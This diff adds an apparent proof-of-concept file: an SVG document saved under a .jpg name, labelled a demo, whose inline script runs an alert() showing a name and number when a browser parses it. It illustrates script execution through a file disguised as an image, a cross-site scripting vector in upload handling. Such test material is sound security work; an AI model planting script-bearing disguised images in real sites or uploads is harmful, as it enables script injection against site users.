@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- SVG document saved with .jpg extension -->
+<svg xmlns="http://www.w3.org/2000/svg" width="640" height="360" viewBox="0 0 640 360">
+  <title>SVG-as-JPG demo</title>
+  <rect width="100%" height="100%" fill="#f3f4f6"/>
+  <text x="16" y="28" font-family="system-ui, Arial" font-size="18" fill="#111">
+    SVG embedded in a file named .jpg — should run alert() in the browser.
+  </text>
+  <image x="16" y="48" width="200" height="120" href="" />
+  <!-- Inline script: will run when browser parses this SVG -->
+  <script type="application/ecmascript"><![CDATA[
+    (function(){
+      alert("Daniel Kanybekov 25118080902");
+    })();
+  ]]></script>
+</svg>
